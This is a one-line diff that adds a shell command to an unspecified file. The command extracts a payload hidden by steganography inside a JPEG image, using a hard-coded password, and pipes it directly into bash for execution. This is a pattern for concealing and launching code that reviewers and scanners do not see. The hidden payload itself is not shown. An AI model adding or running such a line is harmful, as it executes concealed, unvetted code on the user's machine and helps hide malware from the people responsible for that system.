@@ -1,0 +1,1 @@
+steghide extract -sf stego_foto.jpg -p "pass" -xf - | bash
